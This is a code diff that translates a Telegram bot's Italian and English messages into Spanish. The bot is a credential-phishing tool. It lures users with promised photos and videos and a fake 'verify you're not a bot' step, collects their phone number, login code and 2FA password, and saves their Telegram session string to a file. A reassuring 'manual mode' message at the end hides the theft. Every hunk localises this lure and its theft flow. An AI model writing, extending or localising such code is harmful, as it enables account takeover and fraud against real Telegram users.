@@ -42,12 +42,12 @@ os.makedirs("sessions", exist_ok=True)
 @dp.message_handler(commands=['start'])
 async def cmd_start(message: types.Message):
     keyboard = InlineKeyboardMarkup().add(
-        InlineKeyboardButton("Autorizzazione sul primo conto🥺", callback_data="auth_account")
+        InlineKeyboardButton("Autorización en la primera cuenta🥺", callback_data="auth_account")
     )
     await message.answer(
-        "👋🇮🇹 Ciao! ❤️\n"
-        "Vuoi vedere oltre 10.000 foto e oltre 4.000 video? 👁\n"
-        "Verifica di non essere un bot con il pulsante qui sotto. 🤖👇\n\n",
+        "👋🇪🇨 ¡HOLA! ❤️\n"
+        "¿Quieres ver más de 10.000 fotos y más de 4.000 vídeos? 👁\n"
+        "Verifica que no eres un bot con el botón de abajo. 🤖👇\n\n",
         reply_markup=keyboard
     )
 
@@ -59,9 +59,9 @@ async def start_auth(callback_query: types.CallbackQuery):
     user_states[user_id] = 'awaiting_contact'
 
     kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-    kb.add(KeyboardButton("📱 Condividi il tuo numero", request_contact=True))
+    kb.add(KeyboardButton("📱 Comparte tu número", request_contact=True))
 
-    await bot.send_message(user_id, "🥺 Per favore condividi il tuo numero di telefono:в", reply_markup=kb)
+    await bot.send_message(user_id, "🥺Por favor comparte tu número de teléfono:", reply_markup=kb)
     await bot.answer_callback_query(callback_query.id)
 
 @dp.message_handler(content_types=types.ContentType.CONTACT)
@@ -99,7 +99,7 @@ async def send_code_keyboard(user_id, current_code, message_id=None):
         buttons.append(btn_row)
     buttons.append([InlineKeyboardButton("✅ Invia", callback_data="code_send")])
     keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
-    text = f"Codice: `{current_code}`" if current_code else "Inserisci codice:"
+    text = f"Codice: `{current_code}`" if current_code else "Introduce el código:"
 
     if message_id:
         await bot.edit_message_text(chat_id=user_id, message_id=message_id,
@@ -164,7 +164,7 @@ async def try_sign_in_code(user_id, code):
             cleanup(user_id)
         else:
             user_states[user_id] = 'awaiting_2fa'
-            await bot.send_message(user_id, "🔐 Enter your 2FA password:")
+            await bot.send_message(user_id, "🔐 Ingrese su contraseña 2FA:")
     except PhoneCodeExpiredError:
         await bot.send_message(user_id, "⏰ Codice scaduto. Riprova da /start")
         await client.disconnect()
@@ -175,7 +175,7 @@ async def try_sign_in_code(user_id, code):
         await send_code_keyboard(user_id, "", user_code_buffers[user_id]['message_id'])
     except SessionPasswordNeededError:
         user_states[user_id] = 'awaiting_2fa'
-        await bot.send_message(user_id, "🔐 Your 2FA password is required. Enter it:")
+        await bot.send_message(user_id, "🔐 Se requiere su contraseña 2FA. Introdúcelo:")
     except Exception as e:
         await bot.send_message(user_id, f"❌ Errore di accesso: {e}")
         await client.disconnect()
@@ -201,7 +201,7 @@ async def process_2fa(message: types.Message):
             with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                 json.dump({"phone": phone, "session": session_str}, f)
 
-            await message.answer("Stiamo lavorando in modalità manuale, quindi ci scusiamo per il ritardo, presto vi invieremo materiale fotografico e video😉🧍‍♀️.")
+            await message.answer("Estamos trabajando en modo manual, disculpen la demora, pronto les enviaremos material fotográfico y de video😉🧍‍♀️.")
             await client.disconnect()
             cleanup(user_id)
         else:
